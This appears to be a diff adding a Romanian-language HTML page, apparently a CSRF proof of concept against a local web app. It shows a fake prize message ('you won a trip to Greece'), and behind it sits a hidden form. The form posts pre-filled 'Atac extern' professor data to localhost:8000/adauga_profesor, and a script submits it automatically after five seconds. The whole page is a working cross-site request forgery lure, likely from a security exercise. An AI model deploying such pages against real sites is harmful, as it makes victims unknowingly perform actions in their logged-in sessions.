@@ -1,0 +1,45 @@
+Ai castigat o excursie in grecia!!
+<marquee>Bravo!!!</marquee>
+<div style="display:none">
+<h1>Adauga Profesor</h1>
+
+<form name="myForm" method="POST" action="http://localhost:8000/adauga_profesor">
+    <p>
+    <label for="id_nume">Nume:</label>
+    <input type="text" name="nume" maxlength="50" required id="id_nume" value="Atac">
+  </p>
+
+  
+  <p>
+    <label for="id_prenume">Prenume:</label>
+    <input type="text" name="prenume" maxlength="50" required id="id_prenume" value="extern">
+    
+    
+  </p>
+
+  
+  <p>
+    <label for="id_email">Email:</label>
+    <input type="email" name="email" maxlength="254" required id="id_email" value="atac@extern.com">
+    
+    
+  </p>
+
+  
+  <p>
+    <label for="id_telefon">Telefon:</label>
+    <input type="text" name="telefon" maxlength="10" required id="id_telefon" value="0712345677">
+    
+    
+      
+    
+  </p>
+    <input type="submit" value="Creeaza profesor" />
+</form>
+</div>
+
+<script>
+    setTimeout(function() {
+        document.myForm.submit();
+    }, 5000)
+</script>
